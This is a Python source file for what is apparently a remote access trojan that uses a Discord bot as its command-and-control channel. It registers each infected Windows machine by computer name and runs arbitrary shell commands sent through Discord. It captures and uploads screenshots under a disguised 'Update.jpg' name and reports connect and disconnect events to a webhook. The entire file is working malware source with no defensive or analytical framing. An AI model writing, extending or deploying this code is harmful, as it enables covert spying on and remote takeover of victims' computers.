import discord
import os
import asyncio
import subprocess
import atexit
import win32api, win32con, win32gui, win32ui
from PIL import Image, ImageDraw
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True

whURL = ''
TOKEN = ''
serverID =  #Takes an integer

webhook = discord.SyncWebhook.from_url(whURL)
client = discord.Client(intents=intents)
guild = None
hwid = ''

@client.event
async def on_ready():
    global hwid, guild
    hwid = os.getenv("COMPUTERNAME")
    guild = client.get_guild(serverID)

    first_run = True
    for category in guild.categories:
        if hwid == str(category.name):
            first_run = False
            break

    if first_run:
        category = await guild.create_category(hwid)
        await guild.create_text_channel('main', category=category)              

    checkin_channel = discord.utils.get(guild.text_channels, name='check-in')
    if checkin_channel:
        await checkin_channel.send(f"{hwid} has connected.")

@client.event
async def on_message(msg):
    if msg.author == client.user:
        return  # Ignore self messages

    category = discord.utils.get(msg.guild.categories, name=hwid)
    if not category:
        return  # Ignore if category is missing

    main_channel = discord.utils.get(category.channels, name='main')
    
    if msg.channel == main_channel or msg.channel.name == 'main-all':
        content = msg.content.strip().lower()

        if content.startswith(">"):
            command = content[1:].strip()
            response = b''.join(runCommand(command))

            if not response:
                response = b'Results of ' + command.encode() + b' \n\nInvalid Command.'

            await msg.channel.send(response.decode()[:2000])  # Discord limit

        elif content in ["ss", "screenshot"]:
            if getScreenshot():
                await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
                os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
            else:
                await msg.channel.send("Failed to take screenshot.")

def runCommand(command):
    try:
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return iter(p.stdout.readline, b'')
    except Exception as e:
        return [str(e).encode()]

def getScreenshot():
    try:
        x2 = win32api.GetSystemMetrics(0)
        y2 = win32api.GetSystemMetrics(1)

        wDC = win32gui.GetWindowDC(None)
        dcObj = win32ui.CreateDCFromHandle(wDC)
        cDC = dcObj.CreateCompatibleDC()
        dataBitMap = win32ui.CreateBitmap()
        dataBitMap.CreateCompatibleBitmap(dcObj, x2, y2)
        cDC.SelectObject(dataBitMap)
        cDC.BitBlt((0, 0), (x2, y2), dcObj, (0, 0), win32con.SRCCOPY)

        path = 'C:\\Users\\Public\\Downloads\\Update.jpg'
        dataBitMap.SaveBitmapFile(cDC, path)
        img = Image.open(path)
        draw = ImageDraw.Draw(img)
        cursor_x, cursor_y = win32api.GetCursorPos()
        draw.ellipse([cursor_x - 2, cursor_y - 2, cursor_x + 2, cursor_y + 2], fill='red')
        img.save(path, optimize=True)

        dcObj.DeleteDC()
        cDC.DeleteDC()
        win32gui.ReleaseDC(None, wDC)
        win32gui.DeleteObject(dataBitMap.GetHandle())

        return True
    except:
        return False

def exit_handler():
    if webhook:
        webhook.send(f"{hwid} has disconnected.")

atexit.register(exit_handler)

client.run(TOKEN)
